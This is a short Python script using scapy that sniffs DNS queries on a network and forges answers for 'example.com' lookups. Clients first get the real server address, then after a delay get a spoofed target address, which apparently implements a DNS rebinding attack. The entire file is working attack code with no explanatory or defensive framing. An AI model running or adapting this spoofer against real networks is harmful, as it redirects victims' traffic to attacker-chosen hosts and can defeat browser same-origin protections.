from scapy.all import *
import sys, time
srv_ip = sys.argv[1]
target_ip = sys.argv[2]
victims = {}
ttl = 20
ttl2 = 60
filter = "udp port 53 and host 172.29.9.214 "
def forward(orig_pkt):
    print("Forwarding: " + orig_pkt[DNSQR].qname)
    response = sr1(IP(dst="8.8.8.8")/UDP(sport=orig_pkt[UDP].sport)/DNS(rd=1,id=orig_pkt[DNS].id,qd=DNSQR(qname=orig_pkt[DNSQR].qname)),verbose=0)
    respPkt = IP(dst=orig_pkt[IP].src)/UDP(dport=orig_pkt[UDP].sport)/DNS()
    respPkt[DNS] = response[DNS]
    send(respPkt)
    return "Responding: " + respPkt.summary()
def handle(pkt):
    #print("got", pkt.summary(), pkt[DNSQR].qname if DNSQR in pkt else "blah")
    if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
        #print("DNS",pkt,pkt[DNSQR].qtype)
        if "example.com" in pkt[DNSQR].qname.decode('ascii') and pkt[DNSQR].qtype == 1:
            src_ip = pkt[IP].src
            now = time.time()
            if src_ip in victims:
                if now - victims[src_ip] > ttl:
                    print("DeltaT",now - victims[src_ip])
                    if now - victims[src_ip] > ttl2:
                        print("Too old; deleting")
                        out_ip = srv_ip
                        del victims[src_ip]
                    else:
                        print("Old enough; sending fake response")
                        out_ip = target_ip
                else:
                    print("Not old enough; Sending proper response")
                    out_ip = srv_ip
            else:
                print("New; Sending proper response")
                out_ip = srv_ip
                victims[src_ip] = time.time()
            spfResp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,rd=1,ra=1,ancount=1,qd=pkt[DNSQR],an=DNSRR(rrname=pkt[DNSQR].qname,rdata=out_ip,ttl=ttl))
            time.sleep(1)
            send(spfResp)
            return "DNS response: " + spfResp.summary()
        else:
            pass#return forward(pkt)
    else:
        return False
print("Sniffing")
sniff(filter = filter, prn=handle)

